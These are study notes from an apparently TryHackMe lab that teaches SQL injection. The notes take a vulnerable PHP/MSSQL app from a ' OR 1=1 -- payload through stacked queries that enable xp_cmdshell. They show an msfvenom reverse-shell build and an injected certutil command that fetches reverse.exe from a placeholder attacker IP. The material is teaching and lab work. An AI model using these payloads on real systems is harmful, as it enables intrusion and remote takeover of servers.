## Table of Contents

  - [Table of Contents](#Table\of\Contents)
          - [Goals](#Goals)
    - [SQL](#SQL)
      - [SQL Injection (SQLi)](#SQL\Injection\(SQLi))
        - [Risks](#Risks)
      - [Preventing SQLi](#Preventing\SQLi)
    - [Stacked Queries](#Stacked\Queries)
          - [Testing for SQLi](#Testing\for\SQLi)
          - [xp_cmdshell](#xp_cmdshell)
    - [Remote Code Execution](#Remote\Code\Execution)
    - [PHP](#PHP)
        - [Searching for SQLi](#Searching\for\SQLi)
      - [Calling Stored Procedures](#Calling\Stored\Procedures)
      - [xp_cmdshell](#xp_cmdshell)
          - [Converting these into a single stacked SQLi payload will look like this:](#Converting\these\into\a\single\stacked SQLi payload\will\look\like\this:)
    - [Remote Code Execution](#Remote\Code\Execution)

## Table of Contents

          - [Goals](#Goals)
    - [SQL](#SQL)
      - [SQL Injection (SQLi)](#SQL\Injection\(SQLi))
        - [Risks](#Risks)
      - [Preventing SQLi](#Preventing\SQLi)
    - [Stacked Queries](#Stacked\Queries)
          - [Testing for SQLi](#Testing\for\SQLi)
          - [xp_cmdshell](#xp_cmdshell)
    - [Remote Code Execution](#Remote\Code\Execution)
    - [PHP](#PHP)
        - [Searching for SQLi](#Searching\for\SQLi)
      - [Calling Stored Procedures](#Calling\Stored\Procedures)
      - [xp_cmdshell](#xp_cmdshell)
          - [Converting these into a single stacked SQLi payload will look like this:](#Converting\these\into\a\single\stacked SQLi payload\will\look\like\this:)
    - [Remote Code Execution](#Remote\Code\Execution)

###### Goals
- Learn to understand and identify SQL injection vulnerabilities.
- Exploit stacked queries to turn SQL Injection into remote code execution
- Help Elf McRed restore the Best festival Website and save its reputation 
### SQL
	Structure Query Language
- Relational databases// Structured collections organised into tables, each consisting of various rows and columns. Withihn these collections, tables are interconnected with pre-defined relationships.
	- This help with efficient data organisation and retrieval. 
	- *customers*, *orders*, *products* for example; would each be separate tables with relationships defined to link customers information to their respective orders through the use of identifiers:
![A diagram illustrating three different tables within a relational database. Table 1 is titled Customers and contains the UUID column titled customer_id. This column is linked to the Customer column in the second table, titled Orders. A column in the Orders table is titled product_ordered, and links to the product_id column in the third table titled Products. Linking these three tables together illustrates how the unique ID from one table can be intrinsically linked to a relational column in another table. This is the foundation of how relational databases operate.](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/9a00fbbf82f94bf2267da26f242576d8.svg)
- Dynamic database
Regardless of what you do on the web, most data is server from SQL queries if it is stored in a database


- SQL provides a rigid way to `query`, `insert`, `delete` the data stored in these tables. Allowing you to retrieve and alter databases as needed. A website or applica

- SQL queries is based on English and consists of structured commands using keywords like **SELECT**, **FROM**, **WHERE**, and **JOIN** to express operations in a natural, language-like way.

#### SQL Injection (SQLi)
- Exploits how web applications handle user input, in particularly SQL queries. 

##### Risks
- Unauthorised access, data theft, data manipulation, or even complete compromise of a web application and its underlying database through remote code execution. If an attacker can control which queries the database executes, they can control the database functions performed and receive the data from said functions.

#### Preventing SQLi
- Sanitize all User input
- Input Validation 


```php
// Retrieve the GET parameter and save it as a variable
$colour = $_GET['colour'];

// Execute an SQL query with the user-supplied variable
$query = "SELECT * FROM tbl_ornaments WHERE colour = '$colour'";
$result = sqlsrv_query($conn, $query);
```

Without adequate security measures, an attacker could manipulate the `'colour'` parameter to execute malicious SQL queries. For instance, instead of searching for a benign colour, they might input `' OR 1=1 --` as the input parameter, which would transform the query into:

```sql
SELECT * FROM tbl_ornaments WHERE colour = '' OR 1=1 --'
```

As the query above shows, the attacker **injected** the malicious payload into the dynamic query. Let's take a look at the payload in more detail:

- `' OR` is part of the injected code, where **OR** is a logical operator in SQL that allows for multiple conditions. In this case, the injected code appends a secondary **WHERE** condition in the query.
- `1=1` is the condition following the **OR** operator. This condition is always true because, in SQL, **1=1** is a simple equality check where the left and right sides are equal. Since 1 always equals 1, this condition always evaluates to true.
- The `--` at the end of the input is a comment in SQL. It tells the database server to ignore everything that comes after it. Ending with a comment is crucial for the attacker because it nullifies the rest of the query and ensures that any additional conditions or syntax in the original query are effectively ignored.
- The condition `colour = ''` is empty, and the `OR 1=1` condition is always true, effectively making the entire **WHERE** condition true for every row in the table.

### Stacked Queries
- Gives large amount of control
- enables attackers to terminate the original (intended) query and execute additional SQL statements in a single injection, potentially leading to more severe consequences such as data modification and calls to stored procedures or functions

`;` signifies one statement's conclusion and another's commencement/initialization 

###### Testing for SQLi
- Search for any parameter fields, or hidden parameters
- submit the characters like single quotes `'` and double quotes `"`. These introduce syntax error's into  the query if not properly sanitized.
	- Try to trigger error's within the suspected SQLi parameter, see if it leaks any sensitive information. 

SQL Server Integration Services (SSIS) or custom application code, legacy applications may have opted to rely on **xp_cmdshell** to execute system-level commands to export the data. While this accomplishes the same task, it poses security and maintainability risks and grants excessive system access to the SQL Server.


it is possible to manually enable `xp_cmdshell` in SQL server through `EXECUTE` (`EXEC`)
queries. Still, it requires the database user to be a member of the `sysadmin` fixed server role or have the `ALTER SETTINGS` server-level permission to execute this command. However, misconfigurations that allow this execution are not uncommon.

###### xp_cmdshell
Stack the folloiwing commands (one method of $n$):
```SQL
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

This will first enable advanced configuration options in SQL server by setting `show advanced options` to `1`.  Then apply the change to the running configuration via the `RECONFIGURE` statement. next, we enable the `xp_cmdshell` procedure by setting `xp_cmdshell` to `1` and applying the change to the running configuration again.

payload would look as follows:
```bash
http://MACHINE_IP/giftresults.php?age='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
```


By requesting the URL with these parameters, we should be able to execute the stacked queries and enable the **xp_cmdshell** procedure. With this feature enabled, we can execute any Windows shell command through the `EXECUTE` (or `EXEC`) statement followed by the command name.

### Remote Code Execution
`certutil.exe` - Windows command line program that is a signed Windows Binary that allows us to make HTTP/s connection. 

**Setting  Up**: create a payload using `msfvenom` allowing us to eventually upgrade our SQL-injected "Shell" into a more standard `reverse shell`.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR.IP.ADDRESS.HERE LPORT=4444 -f exe -o reverse.exe
```

### PHP
PHP is a general-purpose scripting language that plays a crucial role in web development. It enables developers to create dynamic and interactive websites by generating HTML content on the server and delivering it to the client's browser. PHP is primarily known for seamless integration with SQL Databases, which makes it a powerful tool for building dynamic web applications.

- It is a **Server-Side** scripting language, meaning the code is executed on the web server before the final HTML is sent to the user's browser. Unlike client-side technologies like HTML, CSS, Javascript, PHP allows developers to perform various server-side tasks, such as connecting to a wide range of databases, executing SQL Queries, processing form data, and dynamically generating web content.
![[Pasted image 20231226002344.png]]

The most common way for PHP to connect to SQL databases is using the **PHP Data Objects (PDO)** extension or specific database server drivers like **mysqli** for **MySQL** or **sqlsrv** for **Microsoft SQL Server (MSSQL)**. The connection is typically established by providing parameters such as the host, username, password, and database name.

After establishing a database connection, we can execute SQL queries through PHP and dynamically generate HTML content based on the returned data to display information such as user profiles, product listings, or blog articles. Returning to our example, if we want our PHP script to fetch information regarding any green-coloured ornaments, we could introduce the following lines:

```php
// Execute an SQL query
$query = "SELECT * FROM tbl_ornaments WHERE colour = 'Green'";
$result = sqlsrv_query($conn, $query);
```

`$query` - This query instructs the database to retrieve all rows from the `tbl_ornaments` table where the "colour" column is set to "Green". We then use the `sqlsrv_query()` function to execute this query.


We could create a simple search form with an input field for users to specify the colour of ornaments they want. Upon submitting the form, the website makes a **GET request** to the search results page, including the user's search parameters within the URL. PHP can access the user's input as a **GET parameter** and dynamically generate a query based on that input.

```php
// Retrieve the GET parameter and save it as a variable
$colour = $_GET['colour'];

// Execute an SQL query with the user-supplied variable
$query = "SELECT * FROM tbl_ornaments WHERE colour = '$colour'";
$result = sqlsrv_query($conn, $query);
```

The above snipper sets the `$colour` var to the retrieved value of the "colour" URL parameter. That variable then gets passed into the `$query` string.


Users can dynamically control the query being executed by the database simply by modifying the URL parameter they include in their request:
`http://example.thm/ornament_search.php?colour=Green`

![[Pasted image 20231226002937.png]]


Without adequate security measures, an attacker could manipulate the "**colour**" parameter to execute malicious SQL queries. For instance, instead of searching for a benign colour, they might input `' OR 1=1 --` as the input parameter, which would transform the query into:

```sql
SELECT * FROM tbl_ornaments WHERE colour = '' OR 1=1 --'
```


`''` - Empty query string
`OR` - or
`1=1` - True
`--` - Comment in SQL. It tells the database server to ignore everything after it. This is crucial because it nullifies the rest of the query and ensures that any additional conditions or syntax in the original query are effectively ignored.


##### Searching for SQLi
1. Begin by navigating the website to simply understand it's functionality.
2. Identify Input parameter fields on the page.
	- Manual enumeration allows us to identify the areas in the application where user input is accepted and used in SQL queries. This can include search fields, login forms, and any input fields that interact with a database.
3. attempt to trigger error's within the parameters by inserting `'` and/or `"`
	- Identify database type
	- Full error message enumeration/examination


#### Calling Stored Procedures
**stacked queries** can be used to call **stored procedures** or functions within a database management system. You can think of stored procedures as extended functions offered by certain database systems, serving various purposes such as enhancing performance and security and encapsulating complex database logic.

A Microsoft SQL Server stored procedure `xp_cmdshell` is a specific command that allows for executing operating system calls. If we can exploit a stacked query to call a stored procedure, we might be able to run operatin system calls and obtain remote code execution. 

#### xp_cmdshell
**xp_cmdshell** is a system-extended stored procedure in Microsoft SQL Server that enables the execution of operating system commands and programs from within SQL Server. It provides a mechanism for SQL Server to interact directly with the host operating system's command shell. While it can be a powerful administrative tool, it can also be a security risk if not used cautiously when enabled.
- Because of the known risks involved it's recommended that this functionality is disabled on production servers (and is by defualt). However, due to misconfiguration and legacy applications that require it, it's common to see it enabled in the wile. 
- It's also possible to manually enable `xp_cmdshell` in SQL Server through `EXECUTE` (`EXEC`) queries. Still, it requires the database server-level permission to execute this command. However, as mentioned previously, misconfigurations that allow this execution are not too uncommon.

The follow stacked commands can attempt to enable `xp_cmdshell`
```SQL
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell';
RECONFIGURE;
```
- First we enable advanced configuration options in SQL server by setting `show advanced options` to `1`. 
- We then apply the change to the running configuration via the `RECONFIGURE` statement
- Next, we enables the `xp_cmdshell` procedure by setting `xp_cmdshell` to `1` and apply the changes to the running configuration again.

###### Converting these into a single stacked SQLi payload will look like this:
```bash
curl -s -vv "http://MACHINE_IP/giftresults.php?age='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --"
```

### Remote Code Execution

Let's confirm if we have remote code execution by attempting to execute **certutil.exe** on the target machine. This command is a native Windows command-line program installed as part of Certificate Services. It's handy in engagements because it is a binary signed by Microsoft and allows us to make HTTP/s connections. In our scenario, we can use it to make an HTTP request to download a file from a web server that we control to confirm that the command was executed. To set this up, let's create a malicious payload using **MSFvenom**, allowing us to eventually upgrade our SQL-injected "shell" into a more standard **reverse shell**.

You can think of a reverse shell as the remote computer (the Best Festival web server) initiating a connection back to our AttackBox, which we're listening for. Once the connection is established, we can gain control of the remote system and interact with the target machine directly. This is the opposite of a typical remote access scenario, where the user is the client and the target machine is the server.


It's time to use our stacked query to call **xp_cmdshell** and execute the **certutil.exe** command on the target to download our payload.

```sql
http://MACHINE_IP/giftresults.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://YOUR.IP.ADDRESS.HERE:8000/reverse.exe C:\Windows\Temp\reverse.exe'; --!
```

**Note:** Ensure to fill in your AttackBox's IP address in the URL.

The above SQL statement will call **certutil** to download the **reverse.exe** file from our Python HTTP server and save it to the Windows temp directory for later use. After requesting the above URL to execute the stacked query, we should immediately know if we were successful by checking the output of our HTTP server. There should be a request for **reverse.exe**


















































































































